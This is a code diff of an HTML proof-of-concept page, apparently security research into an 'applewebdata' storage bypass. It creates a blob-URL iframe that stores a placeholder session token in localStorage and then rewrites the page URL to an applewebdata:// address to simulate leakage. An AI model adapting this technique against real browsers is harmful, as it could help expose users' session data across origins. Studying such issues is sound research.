@@ -4,26 +4,33 @@
   <title>Applewebdata Storage Bypass - Scenario 2</title>
   <script>
     async function simulateStorageLeakage() {
-      const innerHTML = `
-        <script>
-          localStorage.setItem('session_token', 'apple-user-1234-secret');
-          document.body.innerHTML = '<h3>Session Stored in LocalStorage</h3>';
-        <\/script>
+      const html = `
+        <html>
+          <body style='margin:0'>
+            <script>
+              localStorage.setItem('session_token', 'apple-user-1234-secret');
+              document.body.innerHTML = '<h3 style="font-family: -apple-system">Session Stored in LocalStorage</h3>';
+            <\/script>
+          </body>
+        </html>
       `;
 
-      const blob = new Blob([innerHTML], { type: 'text/html' });
+      const blob = new Blob([html], { type: 'text/html' });
       const blobURL = URL.createObjectURL(blob);
 
       const iframe = document.createElement('iframe');
       iframe.src = blobURL;
-      iframe.style = 'width:100vw;height:100vh;border:none';
+      iframe.style = 'width:100vw;height:100vh;border:none;';
+      iframe.onload = () => {
+        console.log('[✓] Iframe loaded with blob content');
+      };
       document.body.appendChild(iframe);
 
-      // Simulate fallback to applewebdata scheme (in real case this could be history or reload)
+      // Simulate fallback to applewebdata scheme
       history.replaceState({}, '', 'applewebdata://LEAK-UUID/index.html');
     }
 
-    window.onload = simulateStorageLeakage;
+    window.addEventListener('DOMContentLoaded', simulateStorageLeakage);
   </script>
 </head>
 <body style="margin:0">
